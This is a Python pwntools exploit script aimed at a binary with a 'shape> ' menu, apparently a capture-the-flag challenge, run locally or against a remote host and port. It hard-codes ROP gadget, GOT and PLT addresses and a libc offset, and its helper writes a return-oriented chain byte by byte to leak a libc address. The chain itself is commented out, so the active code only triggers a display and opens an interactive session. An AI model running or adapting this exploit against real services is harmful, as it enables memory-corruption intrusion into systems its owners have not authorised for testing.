import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###

pop_rdi =  0x0000000000400ee3
pop_rsi_r15 = 0x0000000000400ee1

_Z_ostream_plt = 0x4008e0
_Znwm_got = 0x602030
_Zst4cout = 0x6020a0

_Znwm_off = 0x0000000000093280

main_addr = 0x400daa
ret_addr = 0x00000000004008ae

def write_payload(payload, counter):
    for i in range(len(payload)):
        _ = target.recvuntil("shape> ")
        print(struct.pack("B", payload[i]) + b" 11 " + str(counter).encode())
        target.sendline(struct.pack("B", payload[i]) + b" 11 " + str(counter).encode())
        counter += 1
    return counter

###main###
def main():
    # counter = 10
    # counter = write_payload(p64(pop_rdi), counter)
    # counter = write_payload(p64(_Zst4cout), counter)
    # counter = write_payload(p64(pop_rsi_r15), counter)
    # counter = write_payload(p64(_Znwm_got), counter)
    # counter = write_payload(b"AAAAAAAA", counter)
    # counter = write_payload(p64(ret_addr), counter)
    # counter = write_payload(p64(_Z_ostream_plt), counter)    
    # counter = write_payload(p64(main_addr), counter)
    
    _ = target.recvuntil("shape> ")
    target.sendline(b"d")

    for i in range(11):
        print(target.recvline())
    print("/////Display/////")

    print(target.recv(8))
    target.interactive()


if __name__ == "__main__":
    main()